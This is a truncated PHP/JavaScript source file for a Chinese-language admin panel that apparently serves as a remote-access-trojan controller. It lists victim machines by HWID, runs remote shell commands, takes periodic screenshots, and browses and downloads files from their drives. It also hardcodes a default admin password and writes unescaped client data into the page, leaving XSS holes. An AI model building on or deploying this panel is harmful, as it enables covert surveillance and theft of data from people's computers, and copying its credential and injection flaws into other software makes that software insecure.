<?php
require_once 'config.php';
session_start();

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

$db = getDB();

// 确保 sessions 表存在。
dbRunWithRetry(function () use ($db) {
    $db->exec("CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_id INTEGER NOT NULL, token TEXT UNIQUE NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME NOT NULL,
    FOREIGN KEY (admin_id) REFERENCES admins(id) ON DELETE CASCADE
)");
});
$stmt = dbQueryWithRetry($db, "SELECT COUNT(*) FROM admins");
if ($stmt->fetchColumn() == 0) {
    $hash = password_hash('haoxiangA1', PASSWORD_DEFAULT);
    dbExecuteWithRetry($db, "INSERT INTO admins (username, password_hash) VALUES (?, ?)", ['haohaojisui', $hash]);
}

$loggedIn = false;
$username = '';

// 检查已登录 session
if (!empty($_SESSION['token'])) {
    $stmt = dbExecuteWithRetry($db, "SELECT username FROM sessions JOIN admins ON sessions.admin_id = admins.id WHERE sessions.token = ? AND sessions.expires_at > datetime('now')", [$_SESSION['token']]);
    $row = $stmt->fetch();
    if ($row) {
        $loggedIn = true;
        $username = $row['username'];
    }
}

// 处理登录
if (!$loggedIn && isset($_POST['action']) && $_POST['action'] === 'login') {
    $user = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';
    $stmt = dbExecuteWithRetry($db, "SELECT * FROM admins WHERE username = ?", [$user]);
    $admin = $stmt->fetch();
    if ($admin && password_verify($pass, $admin['password_hash'])) {
        try {
            $token = dbRunWithRetry(function () use ($db, $admin) {
                $token = bin2hex(random_bytes(32));
                $db->beginTransaction();
                try {
                    $stmt = $db->prepare("DELETE FROM sessions WHERE admin_id = ?");
                    $stmt->execute([$admin['id']]);
                    $stmt = $db->prepare("INSERT INTO sessions (admin_id, token, expires_at) VALUES (?, ?, datetime('now', '+1 day'))");
                    $stmt->execute([$admin['id'], $token]);
                    $db->commit();
                    return $token;
                } catch (Exception $e) {
                    if ($db->inTransaction()) {
                        $db->rollBack();
                    }
                    throw $e;
                }
            });
            $_SESSION['token'] = $token;
            $loggedIn = true;
            $username = $user;
        } catch (PDOException $e) {
            $loginError = '数据库繁忙，请稍后重试';
        }
    } else {
        $loginError = '用户名或密码错误';
    }
}
// Handle logout.
if ($loggedIn && isset($_GET['logout'])) {
    if (!empty($_SESSION['token'])) {
        dbExecuteWithRetry($db, "DELETE FROM sessions WHERE token = ?", [$_SESSION['token']]);
    }
    unset($_SESSION['token']);
    session_destroy();
    header('Location: logs.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>后台管理系统</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Microsoft YaHei', Arial, sans-serif; background: #f5f5f5; }
.container { max-width: 1600px; margin: 0 auto; padding: 15px; }
.header { background: #2c3e50; color: white; padding: 15px 20px; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
.header h1 { font-size: 20px; }
.header-right { display: flex; align-items: center; gap: 15px; font-size: 13px; }
.header-right .user { opacity: 0.8; }
.btn-logout { background: #e74c3c; color: white; border: none; padding: 5px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; }
.btn-logout:hover { background: #c0392b; }
.stats-bar { display: flex; gap: 15px; margin-bottom: 15px; }
.stat-card { flex: 1; background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
.stat-card h3 { font-size: 13px; color: #666; margin-bottom: 5px; }
.stat-card .value { font-size: 28px; font-weight: bold; color: #2c3e50; }
.stat-card.online .value { color: #27ae60; }
.panel { display: flex; gap: 15px; }
.sidebar { width: 280px; flex-shrink: 0; }
.sidebar-card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); overflow: hidden; }
.sidebar-header { background: #34495e; color: white; padding: 10px 15px; font-size: 14px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
.client-item { padding: 10px 15px; border-bottom: 1px solid #eee; cursor: pointer; transition: background 0.2s; display: flex; justify-content: space-between; align-items: center; }
.client-item:hover { background: #e8f4fd; }
.client-item.active { background: #d5eaf7; border-left: 3px solid #3498db; }
.client-item .hostname { font-weight: bold; font-size: 13px; }
.client-item .ip { font-size: 11px; color: #999; }
.client-item .status { font-size: 11px; padding: 2px 8px; border-radius: 10px; }
.status.online { background: #d4edda; color: #155724; }
.status.offline { background: #f8d7da; color: #721c24; }
.main-area { flex: 1; }
.tabs { display: flex; gap: 2px; margin-bottom: 0; }
.tab { padding: 10px 20px; background: #e0e0e0; border: none; border-radius: 8px 8px 0 0; cursor: pointer; font-size: 13px; font-weight: bold; transition: all 0.2s; }
.tab:hover { background: #d0d0d0; }
.tab.active { background: white; color: #2c3e50; }
.tab-content { background: white; border-radius: 0 8px 8px 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 15px; min-height: 500px; display: none; }
.tab-content.active { display: block; }
.no-client { text-align: center; padding: 60px 20px; color: #999; font-size: 16px; }
.no-client .icon { font-size: 48px; margin-bottom: 10px; }
.terminal { background: #1e1e1e; border-radius: 4px; overflow: hidden; }
.terminal-output { background: #1e1e1e; color: #d4d4d4; font-family: Consolas, monospace; font-size: 13px; padding: 15px; height: 400px; overflow-y: auto; line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
.terminal-input-row { display: flex; border-top: 1px solid #333; }
.terminal-input-row input { flex: 1; background: #2d2d2d; color: #d4d4d4; border: none; padding: 10px 15px; font-family: Consolas, monospace; font-size: 13px; outline: none; }
.terminal-input-row button { background: #0e639c; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 13px; }
.terminal-input-row button:hover { background: #1177bb; }
.terminal-prompt { color: #569cd6; }
.terminal-output .info { color: #6a9955; }
.terminal-output .error { color: #f44747; }
.screenshot-area { text-align: center; }
.screenshot-area img { max-width: 100%; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
.screenshot-actions { margin: 15px 0; display: flex; gap: 10px; justify-content: center; }
.btn { padding: 8px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; transition: background 0.2s; }
.btn-primary { background: #3498db; color: white; }
.btn-primary:hover { background: #2980b9; }
.btn-success { background: #27ae60; color: white; }
.btn-success:hover { background: #219a52; }
.btn-danger { background: #e74c3c; color: white; }
.btn-danger:hover { background: #c0392b; }
.btn-sm { padding: 5px 12px; font-size: 12px; }
.file-toolbar { display: flex; gap: 10px; margin-bottom: 10px; align-items: center; }
.file-toolbar input { flex: 1; padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 13px; }
.file-grid { border: 1px solid #eee; border-radius: 4px; overflow: hidden; }
.file-item { display: flex; align-items: center; padding: 8px 15px; border-bottom: 1px solid #f0f0f0; cursor: default; transition: background 0.15s; }
.file-item:hover { background: #f8f9fa; }
.file-item .name { flex: 1; font-size: 13px; }
.file-item .size { width: 100px; text-align: right; font-size: 12px; color: #999; }
.file-item .time { width: 160px; text-align: right; font-size: 12px; color: #999; }
.file-item .actions { width: 150px; text-align: right; display:flex; justify-content:flex-end; gap:6px; }
.file-item.folder { font-weight: bold; }
.file-item.folder .name::before { content: "📁 "; }
.file-item.file .name::before { content: "📄 "; }
.file-item.parent .name::before { content: "⬆ "; }
.file-layout { display:flex; gap:14px; min-height:520px; }
.file-browser { flex: 1.1; min-width: 0; }
.file-preview { flex: 0.9; min-width: 0; border:1px solid #eee; border-radius:8px; background:#fafafa; display:flex; flex-direction:column; }
.preview-header { padding:12px 14px; border-bottom:1px solid #eee; background:#fff; }
.preview-title { font-size:14px; font-weight:bold; color:#2c3e50; }
.preview-meta { margin-top:4px; font-size:12px; color:#888; word-break:break-all; }
.preview-body { flex:1; overflow:auto; padding:14px; }
.preview-empty { color:#999; text-align:center; padding:80px 20px; }
.preview-text { white-space:pre-wrap; word-break:break-word; font-family:Consolas, monospace; font-size:12px; line-height:1.6; color:#333; background:#fff; border:1px solid #eee; border-radius:6px; padding:12px; }
.preview-image { text-align:center; }
.preview-image img { max-width:100%; max-height:480px; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.15); background:#fff; }
.preview-binary { color:#666; font-size:13px; line-height:1.8; background:#fff; border:1px dashed #ddd; border-radius:6px; padding:16px; }
.btn-secondary { background:#7f8c8d; color:#fff; }
.btn-secondary:hover { background:#6c7a7b; }
.log-viewer { background: #1e1e1e; border-radius: 4px; }
.log-header { background: #34495e; color: white; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
.log-content { padding: 15px; font-family: Consolas, monospace; font-size: 12px; line-height: 1.6; max-height: 500px; overflow-y: auto; }
.log-line { margin-bottom: 3px; white-space: pre-wrap; word-break: break-all; }
.log-line.DEBUG { color: #4fc3f7; }
.log-line.INFO { color: #66bb6a; }
.log-line.WARNING { color: #ffa726; }
.log-line.ERROR { color: #ef5350; }
.cmd-history { max-height: 200px; overflow-y: auto; margin-top: 10px; }
.cmd-history-item { padding: 5px 10px; font-size: 12px; border-bottom: 1px solid #f0f0f0; }
.cmd-history-item .cmd { color: #3498db; }
.cmd-history-item .cmd-result { color: #666; white-space: pre-wrap; font-family: Consolas, monospace; font-size: 11px; margin-top: 2px; }
.toast { position: fixed; bottom: 20px; right: 20px; background: #333; color: white; padding: 12px 24px; border-radius: 6px; font-size: 13px; opacity: 0; transition: opacity 0.3s; z-index: 9999; }
.toast.show { opacity: 1; }

/* Device info */
.device-info { background: #f8f9fa; border-radius: 8px; padding: 12px 15px; margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 15px; font-size: 12px; border: 1px solid #e0e0e0; }
.device-info .item { display: flex; align-items: center; gap: 5px; }
.device-info .label { color: #999; }
.device-info .value { color: #2c3e50; font-weight: bold; }
.device-info .value.online { color: #27ae60; }
.device-info .value.offline { color: #e74c3c; }

/* Login */
.login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 10000; }
.login-box { background: white; border-radius: 12px; padding: 40px; width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
.login-box h2 { text-align: center; margin-bottom: 8px; font-size: 22px; color: #2c3e50; }
.login-box .subtitle { text-align: center; color: #999; font-size: 13px; margin-bottom: 25px; }
.login-box .form-group { margin-bottom: 16px; }
.login-box label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; }
.login-box input { width: 100%; padding: 10px 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; outline: none; }
.login-box input:focus { border-color: #3498db; }
.login-box .btn { width: 100%; padding: 12px; font-size: 15px; border-radius: 6px; margin-top: 8px; }
.login-box .error { color: #e74c3c; font-size: 13px; text-align: center; margin-top: 10px; }
.download-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.45); display:flex; justify-content:center; align-items:center; z-index:10001; }
.download-overlay.hidden { display:none; }
.download-box { background:#fff; border-radius:12px; padding:30px 40px; width:420px; text-align:center; box-shadow:0 8px 32px rgba(0,0,0,0.2); }
.download-box h3 { margin:0 0 8px; font-size:17px; }
.dl-path { color:#666; font-size:13px; word-break:break-all; margin-bottom:18px; }
.dl-bar { height:8px; background:#e9ecef; border-radius:4px; overflow:hidden; margin-bottom:10px; }
.dl-fill { height:100%; width:0%; background:linear-gradient(90deg,#3498db,#2ecc71); border-radius:4px; transition:width .4s ease; }
.dl-info { color:#888; font-size:13px; }
</style>
</head>
<body>

<?php if (!$loggedIn): ?>
<div class="login-overlay" id="loginOverlay">
  <div class="login-box">
    <h2>后台管理系统</h2>
    <div class="subtitle">请输入管理员账号密码登录</div>
    <form method="post">
      <input type="hidden" name="action" value="login">
      <div class="form-group">
        <label for="user">用户名</label>
        <input type="text" id="user" name="username" placeholder="请输入用户名" autocomplete="off" required>
      </div>
      <div class="form-group">
        <label for="pass">密码</label>
        <input type="password" id="pass" name="password" placeholder="请输入密码" required>
      </div>
      <button type="submit" class="btn btn-primary">登录</button>
      <?php if (!empty($loginError)): ?>
      <div class="error"><?=htmlspecialchars($loginError)?></div>
      <?php endif; ?>
    </form>
  </div>
</div>
<?php else: ?>

<div class="container">
  <div class="header">
    <h1>后台管理系统</h1>
    <div class="header-right">
      <span class="user"><?=htmlspecialchars($username)?></span>
      <a href="?logout=1" class="btn-logout">退出登录</a>
    </div>
  </div>

  <div class="stats-bar" id="stats">
    <div class="stat-card"><h3>客户端总数</h3><div class="value" id="statTotal">-</div></div>
    <div class="stat-card online"><h3>在线客户端</h3><div class="value" id="statOnline">-</div></div>
    <div class="stat-card"><h3>命令总数</h3><div class="value" id="statCmds">-</div></div>
    <div class="stat-card"><h3>截图总数</h3><div class="value" id="statScreens">-</div></div>
  </div>

  <div class="panel">
    <div class="sidebar">
      <div class="sidebar-card">
        <div class="sidebar-header"><span>客户端列表</span><span id="clientCount" style="font-size:12px;opacity:0.7;"></span></div>
        <div id="clientList" style="max-height:600px;overflow-y:auto;"></div>
      </div>
    </div>

    <div class="main-area" id="mainArea">
      <div class="no-client" id="noClient"><div class="icon">💻</div><p>请先从左侧选择一个客户端</p></div>

      <div id="clientPanel" style="display:none;">
        <div class="device-info" id="deviceInfo"><span style="color:#999;">选择客户端后将在这里显示设备信息</span></div>
        <div class="tabs">
          <button class="tab active" onclick="switchTab(event, 'terminal')">终端</button>
          <button class="tab" onclick="switchTab(event, 'screenshot')">截图</button>
          <button class="tab" onclick="switchTab(event, 'files')">文件管理</button>
          <button class="tab" onclick="switchTab(event, 'logs')">系统日志</button>
        </div>

        <div id="tab-terminal" class="tab-content active">
          <div class="terminal">
            <div class="terminal-output" id="termOutput"></div>
            <div class="terminal-input-row">
              <input type="text" id="termInput" placeholder="输入命令..." onkeydown="if(event.key==='Enter')sendCommand()">
              <button onclick="sendCommand()">发送</button>
            </div>
          </div>
          <div class="cmd-history" id="cmdHistory"></div>
        </div>

        <div id="tab-screenshot" class="tab-content">
          <div class="screenshot-actions">
            <button class="btn btn-primary" onclick="requestScreenshot()">请求截图</button>
            <button class="btn btn-success" onclick="startAutoScreen()" id="autoScreenBtn">自动截图(关)</button>
          </div>
          <div class="screenshot-area" id="screenArea"><p style="color:#999;padding:40px;">点击“请求截图”获取客户端屏幕</p></div>
        </div>

        <div id="tab-files" class="tab-content">
          <div class="file-layout">
            <div class="file-browser">
              <div class="file-toolbar">
                <button class="btn btn-sm btn-primary" onclick="refreshFileList()">刷新</button>
                <input type="text" id="filePath" value="C:\" onkeydown="if(event.key==='Enter')refreshFileList()">
                <button class="btn btn-sm" onclick="goUpDir()">上一级</button>
              </div>
              <div class="file-grid" id="fileGrid"><div style="padding:30px;text-align:center;color:#999;">输入路径后点击刷新加载文件列表</div></div>
            </div>
            <div class="file-preview">
              <div class="preview-header">
                <div class="preview-title" id="previewTitle">文件预览</div>
                <div class="preview-meta" id="previewMeta">选择文件后在这里显示内容</div>
              </div>
              <div class="preview-body" id="previewBody">
                <div class="preview-empty">暂未选择文件</div>
              </div>
            </div>
          </div>
        </div>

        <div id="tab-logs" class="tab-content">
          <div style="margin-bottom:10px;">
            <select id="logLevel" style="padding:6px 10px;border:1px solid #ddd;border-radius:4px;">
              <option value="">全部级别</option>
              <option value="DEBUG">DEBUG</option>
              <option value="INFO">INFO</option>
              <option value="WARNING">WARNING</option>
              <option value="ERROR">ERROR</option>
            </select>
            <button class="btn btn-sm btn-primary" onclick="loadSystemLogs()" style="margin-left:10px;">刷新</button>
          </div>
          <div class="log-viewer">
            <div class="log-header"><span>系统日志</span><span id="logCount">0 条</span></div>
            <div class="log-content" id="systemLogs"><div class="loading">加载中...</div></div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<?php endif; ?>
<div class="toast" id="toast"></div>
<div class="download-overlay hidden" id="dlOverlay">
  <div class="download-box">
    <h3>下载进度</h3>
    <div class="dl-path" id="dlPath"></div>
    <div class="dl-bar"><div class="dl-fill" id="dlFill"></div></div>
    <div class="dl-info" id="dlInfo">准备中...</div>
    <button class="btn btn-sm" onclick="cancelDownload()" style="margin-top:12px;">取消</button>
  </div>
</div>
<script>
const API = 'api.php';
let currentClientId = null;
let autoScreenTimer = null;
let cmdHistory = [];
let lastPollId = 0;
let lastFilePollId = 0;
let lastDownloadPollId = 0;
let lastPreviewPollId = 0;
let currentPreviewPath = '';

function $(id) { return document.getElementById(id); }
function toast(msg) { const t=$('toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),3000); }

function apiUrl(action, extra) {
  let url = API + '?action=' + action + '&_t=' + Date.now();
  if (extra) url += '&' + extra;
  return url;
}

function apiPost(action, body) {
  const opts = { method:'POST', headers:{'Content-Type':'application/json'}, cache:'no-store' };
  opts.body = JSON.stringify(body);
  return fetch(API + '?action=' + action + '&_t=' + Date.now(), opts).then(wrapJsonResponse);
}

function apiGet(action, extra) {
  return fetch(apiUrl(action, extra), { cache:'no-store' }).then(wrapJsonResponse);
}

function wrapJsonResponse(response) {
  const originalText = response.text.bind(response);
  response.json = async function() {
    const raw = await originalText();
    const clean = raw.replace(/^\uFEFF/, '').trim();
    return JSON.parse(clean);
  };
  return response;
}

function initApp() {
  loadStats(); loadClients(); loadSystemLogs();
  setInterval(() => {
    loadStats();
    loadClients();
    if (currentClientId) {
      loadDeviceInfo(currentClientId);
      loadCommandHistory();
    }
  }, 3000);
  setInterval(loadSystemLogs, 3000);
}

async function loadStats() {
  try {
    const r=await apiGet('statistics'); const d=await r.json();
    if(d.success){
      $('statTotal').textContent=d.data.total_clients;
      $('statOnline').textContent=d.data.online_clients;
      $('statCmds').textContent=d.data.total_commands;
      $('statScreens').textContent=d.data.total_screenshots;
    }
  }catch(e){}
}

async function loadClients() {
  try {
    const r=await apiGet('list_clients');
    if(!r.ok){ console.error('HTTP',r.status); return; }
    const d=await r.json();
    if(!d.success){ console.error('API error',d); return; }
    if(!d.data||d.data.length===0){ $('clientList').innerHTML='<div style="padding:20px;text-align:center;color:#999;">暂无客户端</div>'; $('clientCount').textContent='0'; return; }
    const list=$('clientList'); list.innerHTML='';
    d.data.forEach(c=>{
      const div=document.createElement('div');
      div.className='client-item'+(currentClientId===c.client_id?' active':'');
      div.dataset.clientId = c.client_id;
      div.innerHTML='<div><div class="hostname">'+(c.hostname||c.ip_address)+'</div><div class="ip">'+c.ip_address+'</div></div><span class="status '+c.status+'">'+(c.status==='online'?'在线':'离线')+'</span>';
      div.onclick=()=>selectClient(c.client_id,c.hostname||c.ip_address);
      list.appendChild(div);
    });
    $('clientCount').textContent = d.data.length+' 个';
  }catch(e){ console.error('loadClients error',e); }
}

function selectClient(clientId, name) {
  currentClientId=clientId;
  $('noClient').style.display='none'; $('clientPanel').style.display='block';
  document.querySelectorAll('.client-item').forEach(el=>el.classList.remove('active'));
  document.querySelectorAll('.client-item').forEach(el=>{ if(el.dataset.clientId===clientId) el.classList.add('active'); });
  $('termOutput').innerHTML=''; $('cmdHistory').innerHTML=''; cmdHistory=[]; lastPollId=0; lastFilePollId=0; lastDownloadPollId=0;
  lastPreviewPollId=0; currentPreviewPath='';
  resetPreview();
  loadDeviceInfo(clientId);
  loadCommandHistory();
}

async function loadDeviceInfo(clientId) {
  try {
    const r=await apiGet('get_client','client_id='+clientId);
    const d=await r.json();
    if(!d.success||!d.data) return;
    const c=d.data;
    const statusClass=c.status==='online'?'online':'offline';
    const statusText=c.status==='online'?'在线':'离线';
    const os=c.os_info||'-';
    const cpu=c.cpu_info||'-';
    const ram=c.ram_total?formatBytes(c.ram_total):'-';
    $('deviceInfo').innerHTML=
      '<div class="item"><span class="label">主机名:</span><span class="value">'+(c.hostname||'-')+'</span></div>'+
      '<div class="item"><span class="label">IP:</span><span class="value">'+c.ip_address+'</span></div>'+
      '<div class="item"><span class="label">端口:</span><span class="value">'+(c.port||'0')+'</span></div>'+
      '<div class="item"><span class="label">系统:</span><span class="value">'+os+'</span></div>'+
      '<div class="item"><span class="label">CPU:</span><span class="value">'+cpu+'</span></div>'+
      '<div class="item"><span class="label">内存:</span><span class="value">'+ram+'</span></div>'+
      '<div class="item"><span class="label">状态:</span><span class="value '+statusClass+'">'+statusText+'</span></div>'+
      '<div class="item"><span class="label">HWID:</span><span class="value" style="font-family:monospace;font-size:11px;">'+(c.hwid||'-')+'</span></div>'+
      '<div class="item"><span class="label">首次上线:</span><span class="value">'+(c.first_seen||'-')+'</span></div>';
  }catch(e){}
}

function formatBytes(bytes) {
  if(!bytes||bytes==0) return '-';
  const u=['B','KB','MB','GB','TB']; let i=0;
  while(bytes>=1024&&i<u.length-1){ bytes/=1024; i++; }
  return bytes.toFixed(i>0?1:0)+' '+u[i];
}

function switchTab(event, name) {
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
  event.target.classList.add('active');
  $('tab-'+name).classList.add('active');
  if(name==='logs') loadSystemLogs();
}

function activateTab(name) {
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
  const buttons = Array.from(document.querySelectorAll('.tab'));
  const btn = buttons.find(item => (item.getAttribute('onclick') || '').includes("'" + name + "'"));
  if (btn) btn.classList.add('active');
  $('tab-'+name).classList.add('active');
  if(name==='logs') loadSystemLogs();
}

function sendCommand() {
  const input=$('termInput'); const cmd=input.value.trim();
  if(!cmd||!currentClientId) return; input.value='';
  const output=$('termOutput');
  output.innerHTML+='<span class="terminal-prompt">C:\\&gt;</span> '+cmd+'\n';
  output.scrollTop=output.scrollHeight;

  if (cmd.startsWith('/download ')) {
    const path = cmd.substring(10).trim();
    output.innerHTML+= '[下载] 正在发送下载请求: ' + path + '\n';
    apiPost('send_command', {client_id:currentClientId, command:{type:'download_to_server', data:path}}).then(r=>r.json()).then(d=>{
      if(d.success) { toast('下载请求已发送'); pollDownloadToServer(path, d.command_id); }
      else { output.innerHTML+= '[错误] ' + (d.error||'发送失败') + '\n'; }
    });
    return;
  }

  apiPost('send_command', {client_id:currentClientId, command:{type:'shell', data:cmd}}).then(r=>r.json()).then(d=>{ if(d.success) toast('命令已发送'); pollCommandResult(cmd); });
}

function pollDownloadToServer(path, commandId) {
  let attempts=0;
  const t=setInterval(()=>{
    attempts++;
    if(attempts>120){ clearInterval(t); toast('下载超时'); return; }
    apiGet('get_command_results','command=download_to_server&client_id='+currentClientId).then(r=>r.json()).then(d=>{
      if(d.success&&d.data.length>0) for(const item of d.data){
        if(commandId && item.id !== commandId) continue;
        if(!commandId && item.id<=lastDownloadPollId) continue;
        lastDownloadPollId=item.id;
        try{
          const data=typeof item.result==='string'?JSON.parse(item.result||'{}'):item.result;
          const output=$('termOutput');
          if(data.type==='download_file') {
            output.innerHTML+= '[完成] 已保存到服务器: ' + data.saved_as + '\n';
          } else if(data.type==='download_dir') {
            output.innerHTML+= '[完成] 目录已下载: ' + data.files + ' 个文件\n';
          } else if(data.error) {
            output.innerHTML+= '[错误] ' + data.error + '\n';
          }
          output.scrollTop=output.scrollHeight;
          clearInterval(t);
        }catch(e){}
      }
    }).catch(()=>{});
  }, 2000);
}

let pollTimer = null;
function pollCommandResult(cmd) {
  if(pollTimer) clearInterval(pollTimer);
  let attempts=0;
  pollTimer=setInterval(()=>{
    attempts++;
    if(attempts>60){ clearInterval(pollTimer); pollTimer=null; return; }
    apiGet('get_command_results','client_id='+currentClientId+'&limit=5').then(r=>r.json()).then(d=>{
      if(d.success&&d.data.length>0) for(const item of d.data){
        if(item.id<=lastPollId||item.command!=='shell') continue;
        lastPollId=item.id; const result=item.result||'';
        if(result){
          clearInterval(pollTimer); pollTimer=null;
          const output=$('termOutput'); output.innerHTML+=result+'\n'; output.scrollTop=output.scrollHeight;
          const hist=$('cmdHistory');
          hist.innerHTML='<div class="cmd-history-item"><div class="cmd">C:\\> '+cmd+'</div><pre class="cmd-result">'+result+'</pre></div>'+hist.innerHTML;
          cmdHistory.unshift({cmd,result});
        }
      }
    });
  }, 2000);
}

function requestScreenshot() {
  if(!currentClientId) return;
    $('screenArea').innerHTML='<p style="color:#999;padding:40px;">等待截图...</p>';
  apiPost('send_command', {client_id:currentClientId, command:{type:'screenshot', data:''}}).then(r=>r.json()).then(d=>{ if(d.success) toast('截图指令已发送'); pollScreenshot(); });
}

function pollScreenshot() {
  let attempts=0;
  const t=setInterval(()=>{
    attempts++;
    if(attempts>30){ clearInterval(t); $('screenArea').innerHTML='<p style="color:#999;padding:40px;">截图超时</p>'; return; }
    apiGet('get_screenshots','client_id='+currentClientId).then(r=>r.json()).then(d=>{
      if(d.success&&d.data.length>0&&d.data[0].image_path){
        clearInterval(t);
        $('screenArea').innerHTML='<img src="screenshots/'+d.data[0].image_path+'?t='+Date.now()+'" style="max-width:100%;border-radius:4px;"><p style="color:#999;font-size:12px;margin-top:8px;">'+d.data[0].created_at+'</p>';
      }
    });
  }, 2000);
}

let autoScrOn=false;
function startAutoScreen() {
  autoScrOn=!autoScrOn;
  $('autoScreenBtn').textContent='自动截图 ('+(autoScrOn?'开':'关')+')';
  if(autoScrOn){ requestScreenshot(); autoScreenTimer=setInterval(requestScreenshot,10000); }
  else { clearInterval(autoScreenTimer); }
}

async function refreshFileList() {
  if(!currentClientId) return;
  const path=normalizeWindowsPath($('filePath').value, true);
  $('filePath').value = path;
  $('fileGrid').innerHTML='<div style="padding:30px;text-align:center;color:#999;">加载中...</div>';
  try {
    const r=await apiPost('send_command', {client_id:currentClientId, command:{type:'list_dir', data:path}});
    const d=await r.json();
    if(!d.success){ toast('发送失败: '+(d.error||'')); return; }
    toast('命令已发送');
    pollFileList(path, d.command_id);
  } catch(e) { toast('网络错误'); console.error(e); }
}

function pollFileList(path, commandId) {
  let attempts=0;
  const t=setInterval(()=>{
    attempts++;
    if(attempts>30){ clearInterval(t); return; }
    const extra = commandId
      ? ('client_id='+currentClientId+'&command_id='+commandId)
      : ('command=list_dir&client_id='+currentClientId);
    apiGet('get_command_results', extra).then(r=>r.json()).then(d=>{
      if(d.success&&d.data.length>0) for(const item of d.data){
        if(!commandId && item.id<=lastFilePollId) continue;
        lastFilePollId=item.id;
        try{
          const data=typeof item.result==='string'?JSON.parse(item.result||'{}'):item.result;
          clearInterval(t);
          renderFileList(data);
        }catch(e){
          clearInterval(t);
          $('fileGrid').innerHTML='<div style="padding:30px;text-align:center;color:#c0392b;">目录结果解析失败</div>';
        }
      }
    });
  }, 2000);
}

function renderFileList(data) {
  const grid=$('fileGrid'); grid.innerHTML='';
  if(!data){ grid.innerHTML='<div style="padding:30px;text-align:center;color:#999;">获取失败</div>'; return; }
  if(data.error){ grid.innerHTML='<div style="padding:30px;text-align:center;color:#c0392b;">'+escapeHtml(data.error)+'</div>'; return; }
  if(!Array.isArray(data.files)){ grid.innerHTML='<div style="padding:30px;text-align:center;color:#999;">返回格式不正确</div>'; return; }
  const currentPath = normalizeWindowsPath(data.path || '', true);
  $('filePath').value = currentPath;
  if(currentPath!==''&&currentPath!=='C:\\'){
    const div=document.createElement('div'); div.className='file-item parent';
    let parentPath='C:\\'; const idx=currentPath.substring(0,currentPath.length-1).lastIndexOf('\\');
    if(idx>0) parentPath=currentPath.substring(0,idx+1);
    div.innerHTML='<div class="name">...</div><div class="size"></div><div class="time"></div><div class="actions"></div>';
    div.onclick=()=>{ $('filePath').value=parentPath; refreshFileList(); };
    grid.appendChild(div);
  }
  (data.dirs||[]).forEach(dir=>{
    const div=document.createElement('div'); div.className='file-item folder';
    const safeDir = String(dir ?? '');
    div.innerHTML='<div class="name">'+escapeHtml(safeDir)+'</div><div class="size">&lt;目录&gt;</div><div class="time"></div><div class="actions"></div>';
    div.onclick=()=>{ const p=currentPath.endsWith('\\')?currentPath+safeDir:currentPath+'\\'+safeDir; $('filePath').value=normalizeWindowsPath(p, true); refreshFileList(); };
    grid.appendChild(div);
  });
  (data.files||[]).forEach(file=>{
    const div=document.createElement('div'); div.className='file-item file';
    const name = String(file.name ?? '');
    const size=file.size||0;
    const fullPath=normalizeWindowsPath((currentPath.endsWith('\\')?currentPath:currentPath+'\\')+name, false);
    div.innerHTML='<div class="name">'+escapeHtml(name)+'</div><div class="size">'+(size?formatSize(size):'')+'</div><div class="time">'+escapeHtml(file.mtime||'')+'</div><div class="actions"></div>';
    const actions = div.querySelector('.actions');
    const previewBtn = document.createElement('button');
    previewBtn.className = 'btn btn-sm btn-secondary';
    previewBtn.textContent = '查看';
    previewBtn.onclick = (event) => { event.stopPropagation(); previewFile(fullPath, size); };
    const downloadBtn = document.createElement('button');
    downloadBtn.className = 'btn btn-sm btn-primary';
    downloadBtn.textContent = '下载';
    downloadBtn.onclick = (event) => { event.stopPropagation(); downloadFile(fullPath, size); };
    actions.appendChild(previewBtn);
    actions.appendChild(downloadBtn);
    grid.appendChild(div);
  });
}

function goUpDir() {
  const p=$('filePath').value; const idx=p.substring(0,p.length-1).lastIndexOf('\\');
  if(idx>0){ $('filePath').value=p.substring(0,idx+1); refreshFileList(); }
}

function resetPreview() {
  $('previewTitle').textContent='文件预览';
  $('previewMeta').textContent='选择文件后在这里显示内容';
  $('previewBody').innerHTML='<div class="preview-empty">暂未选择文件</div>';
}

function previewFile(path, fileSize) {
  if(!currentClientId) return;
  path = normalizeWindowsPath(path, false);
  currentPreviewPath = path;
  $('previewTitle').textContent = path.split('\\').pop() || path;
  $('previewMeta').textContent = path + (fileSize ? (' · ' + formatSize(fileSize)) : '');
